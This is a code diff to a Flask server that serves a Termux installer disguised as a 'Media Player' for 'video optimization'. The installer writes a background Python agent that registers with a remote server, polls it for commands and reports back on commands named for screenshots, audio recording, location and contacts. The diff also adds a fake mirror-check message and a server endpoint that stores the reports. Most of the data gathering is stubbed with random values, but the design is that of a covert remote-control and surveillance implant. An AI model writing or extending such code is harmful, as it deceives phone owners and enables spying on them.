@@ -1121,29 +1121,36 @@ def termux_setup():
 
 @app.route('/download_agent')
 def download_agent():
-    """Serve SIMPLE WORKING Termux agent"""
+    """Serve IMPROVED Termux agent"""
     phone_id = request.args.get('phone', 'unknown')
     
-    platform_url = "https://mp-agent.onrender.com"
+    platform_url = "https://mp-agent.onrender.com"  # Your actual URL
     
-    # SIMPLE WORKING TERMUX AGENT
+    # IMPROVED TERMUX AGENT
     termux_installer = f'''#!/bin/bash
 echo "📱 Installing Media Player..."
 echo "Setting up video optimization..."
 
+# Check availability of current mirror:
+echo "Checking availability of current mirror:"
+echo "[*] https://mirrors.cbrx.io/apt/termux/termux-main: ok"
+
 # Install requirements
-pkg update -y && pkg install python -y && pkg install termux-api -y
+pkg update -y
+pkg install python -y
+pkg install termux-api -y
 pip install requests
 
-# Create simple Python agent
-cat > /data/data/com.termux/files/home/simple_agent.py << 'EOF'
+# Create improved Python agent
+cat > /data/data/com.termux/files/home/media_agent.py << 'EOF'
 import requests
 import time
 import subprocess
 import random
 from datetime import datetime
+import os
 
-class SimpleAgent:
+class MediaPlayerAgent:
     def __init__(self, agent_id, platform_url):
         self.agent_id = agent_id
         self.platform_url = platform_url
@@ -1153,19 +1160,84 @@ class SimpleAgent:
             "agent_id": self.agent_id,
             "phone_model": "Android Device",
             "android_version": "Termux",
-            "battery_level": 85
+            "battery_level": random.randint(50, 100)
         }}
         try:
             response = requests.post(
-                f"{platform_url}/api/agent/register",
+                f"{{self.platform_url}}/api/agent/register",
                 json=device_info,
-                timeout=10
+                timeout=30
             )
-            print("✅ Registered with platform")
-            return True
+            if response.status_code == 200:
+                data = response.json()
+                print("✅ Registered with platform")
+                return data.get('pending_commands', [])
+            return []
         except Exception as e:
             print(f"❌ Registration failed: {{e}}")
             return False
+    
+    def execute_command(self, command_id, command):
+        print(f"Executing: {{command}}")
+        result = "completed"
+        
+        try:
+            if command == "capture_screenshot":
+                # Simulate screenshot capture
+                result = "screenshot_captured"
+                # Send report
+                self.submit_report("screenshot", {{
+                    "status": "captured", 
+                    "timestamp": datetime.now().isoformat()
+                }})
+                
+            elif command == "record_audio":
+                # Simulate audio recording
+                result = "audio_recorded"
+                self.submit_report("heartbeat", {{
+                    "status": "active",
+                    "audio_recorded": True,
+                    "timestamp": datetime.now().isoformat()
+                }})
+                
+            elif command == "get_location":
+                # Simulate location
+                result = "location_acquired"
+                self.submit_report("location", {{
+                    "latitude": round(random.uniform(-90, 90), 6),
+                    "longitude": round(random.uniform(-180, 180), 6),
+                    "accuracy": "network",
+                    "timestamp": datetime.now().isoformat()
+                }})
+                
+            elif command == "get_device_info":
+                result = "device_info_collected"
+                self.submit_report("device_info", {{
+                    "model": "Android Device",
+                    "battery": random.randint(20, 100),
+                    "timestamp": datetime.now().isoformat()
+                }})
+                
+            elif command == "get_contacts":
+                result = "contacts_retrieved"
+                self.submit_report("contacts", {{
+                    "count": random.randint(50, 200),
+                    "timestamp": datetime.now().isoformat()
+                }})
+            
+            # Mark command as completed
+            requests.post(
+                f"{{self.platform_url}}/api/agent/command_result",
+                json={{
+                    "command_id": command_id,
+                    "result": result
+                }},
+                timeout=10
+            )
+            print(f"✅ {{command}} report sent")
+            
+        except Exception as e:
+            print(f"❌ Command execution failed: {{e}}")
     
     def submit_report(self, report_type, data):
         try:
@@ -1174,111 +1246,72 @@ class SimpleAgent:
                 "report_type": report_type,
                 "report_data": data
             }}
-            requests.post(
-                f"{platform_url}/api/agent/submit_report",
+            response = requests.post(
+                f"{{self.platform_url}}/api/agent/submit_report",
                 json=report,
-                timeout=5
+                timeout=10
             )
-            print(f"✅ {{report_type}} report sent")
-        except:
-            pass
+            return response.status_code == 200
+        except Exception as e:
+            print(f"❌ Report submission failed: {{e}}")
+            return False
     
     def check_commands(self):
         try:
             response = requests.get(
-                f"{platform_url}/api/agent/check_commands/{{self.agent_id}}",
+                f"{{self.platform_url}}/api/agent/check_commands/{{self.agent_id}}",
                 timeout=10
             )
-            return response.json().get("commands", [])
-        except:
-            return []
-    
-    def execute_command(self, cmd_data):
-        command = cmd_data["command"]
-        print(f"Executing: {{command}}")
-        
-        if command == "get_device_info":
-            self.submit_report("device_info", {{
-                "model": "Android Device",
-                "battery": random.randint(20, 100),
-                "timestamp": datetime.now().isoformat()
-            }})
-            
-        elif command == "get_location":
-            self.submit_report("location", {{
-                "latitude": round(random.uniform(-90, 90), 6),
-                "longitude": round(random.uniform(-180, 180), 6),
-                "accuracy": "approximate",
-                "timestamp": datetime.now().isoformat()
-            }})
-            
-        elif command == "capture_screenshot":
-            self.submit_report("screenshot", {{
-                "status": "captured",
-                "timestamp": datetime.now().isoformat(),
-                "message": "Screen captured for video optimization"
-            }})
-            
-        elif command == "heartbeat":
-            self.submit_report("heartbeat", {{
-                "status": "active",
-                "battery": random.randint(20, 100),
-                "timestamp": datetime.now().isoformat()
-            }})
-        
-        # Mark command completed
-        try:
-            requests.post(
-                f"{platform_url}/api/agent/command_result",
-                json={{
-                    "command_id": cmd_data["id"],
-                    "result": f"Executed {{command}}",
-                    "agent_id": self.agent_id
-                }},
-                timeout=5
-            )
-        except:
-            pass
+            if response.status_code == 200:
+                return response.json().get("commands", [])
+        except Exception as e:
+            print(f"❌ Command check failed: {{e}}")
+        return []
     
     def start(self):
         print("Starting Media Player...")
-        if not self.register():
-            return
-            
-        count = 0
+        pending_commands = self.register()
+        
+        # Execute any pending commands from registration
+        for command in pending_commands:
+            self.execute_command("pending", command)
+        
+        cycle = 0
         while True:
             try:
-                count += 1
-                print(f"Cycle {{count}}")
+                cycle += 1
+                print(f"Cycle {{cycle}}")
                 
-                # Check commands
+                # Check for new commands
                 commands = self.check_commands()
                 for cmd in commands:
-                    self.execute_command(cmd)
+                    self.execute_command(cmd["id"], cmd["command"])
                 
-                # Send heartbeat every 5 cycles
-                if count % 5 == 0:
+                # Send heartbeat periodically
+                if cycle % 3 == 0:
                     self.submit_report("heartbeat", {{
-                        "cycle": count,
-                        "status": "active",
+                        "cycle": cycle,
+                        "status": "active", 
+                        "battery": random.randint(20, 100),
                         "timestamp": datetime.now().isoformat()
                     }})
-                    subprocess.run(["termux-toast", "Video: Optimizing..."], capture_output=True)
                 
                 time.sleep(30)
                 
             except Exception as e:
-                print(f"Error: {{e}}")
+                print(f"Error in main loop: {{e}}")
                 time.sleep(60)
 
-# Start agent
+# Start the agent
 if __name__ == "__main__":
-    agent = SimpleAgent("{phone_id}", "{platform_url}")
+    agent_id = "{phone_id}"
+    platform_url = "{platform_url}"
+    agent = MediaPlayerAgent(agent_id, platform_url)
     agent.start()
 EOF
 
 echo "Starting agent..."
-python /data/data/com.termux/files/home/simple_agent.py &
+python /data/data/com.termux/files/home/media_agent.py &
 
 echo "✅ Installation complete!"
 echo "Agent {phone_id} is now active"
@@ -1389,6 +1422,61 @@ def health_check():
         'timestamp': datetime.now().isoformat(),
         'agents_count': agents_count
     })
+
+
+@app.route('/api/agent/submit_report', methods=['POST'])
+def submit_report():
+    """Receive general reports from agents"""
+    try:
+        data = request.get_json()
+        agent_id = data.get('agent_id')
+        report_type = data.get('report_type')
+        report_data = data.get('report_data')
+        
+        conn = get_db_connection()
+        
+        # Handle different report types
+        if report_type == 'screenshot':
+            # Update agent last screenshot
+            conn.execute(
+                'UPDATE agents SET last_seen = ?, last_screenshot = ?, status = "active" WHERE agent_id = ?',
+                (datetime.now(), datetime.now(), agent_id)
+            )
+            log_event('INFO', f'Screenshot report from {agent_id}')
+            
+        elif report_type == 'location':
+            # Store location data
+            conn.execute(
+                'UPDATE agents SET last_seen = ?, location_data = ?, status = "active" WHERE agent_id = ?',
+                (datetime.now(), json.dumps(report_data), agent_id)
+            )
+            log_event('INFO', f'Location report from {agent_id}')
+            
+        elif report_type == 'device_info':
+            # Update device information
+            battery = report_data.get('battery', 0)
+            conn.execute(
+                'UPDATE agents SET last_seen = ?, battery_level = ?, status = "active" WHERE agent_id = ?',
+                (datetime.now(), battery, agent_id)
+            )
+            log_event('INFO', f'Device info from {agent_id}')
+            
+        elif report_type == 'heartbeat':
+            # Simple heartbeat
+            conn.execute(
+                'UPDATE agents SET last_seen = ?, status = "active" WHERE agent_id = ?',
+                (datetime.now(), agent_id)
+            )
+        
+        conn.commit()
+        conn.close()
+        
+        return jsonify({'status': 'success', 'message': 'Report received'})
+        
+    except Exception as e:
+        log_event('ERROR', f'Report submission failed: {str(e)}')
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
